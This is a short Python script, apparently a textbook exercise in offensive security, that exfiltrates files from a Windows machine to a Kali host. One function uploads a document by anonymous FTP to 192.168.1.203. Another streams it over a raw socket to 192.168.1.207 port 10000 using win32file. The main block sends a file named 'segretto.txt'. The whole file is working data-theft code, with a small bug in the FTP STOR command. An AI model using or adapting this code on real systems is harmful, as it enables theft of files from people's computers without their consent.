# Send encrypted data via file tranfer
# Enable FTP in Kali to accept anonym downloads

import ftplib
import os
import socket
import win32file

def plain_ftp(docpath, server='192.168.1.203'):
    # Pass path to file and IP to FTP server (kali in this case)
    ftp = ftplib.FTP(server) 
    ftp.login("anonymous", "anon@example.com")
    # Connect to server
    ftp.cwd('/pub/')
    # Get to target dir
    ftp.storbinary("STOR" + os.path.basename(docpath), open(docpath, "rb"), 1024)
    # Write file to target
    ftp.quit()

def transmit(document_path):
    client = socket.socket() # Create a FTP client (𝘴𝘦𝘦 𝘤𝘩2)
    client.connect(('192.168.1.207', 10000)) # Ussing port 10000
    with open(document_path, 'rb') as f:
        win32file.TransmitFile(
            client, 
            win32file._get_osfhandle(f.fileno()),
            0, 0, None, 0, b'', b'')
        # Transfer file

if __name__=='__main__':
    transmit('./segretto.txt')
    # Test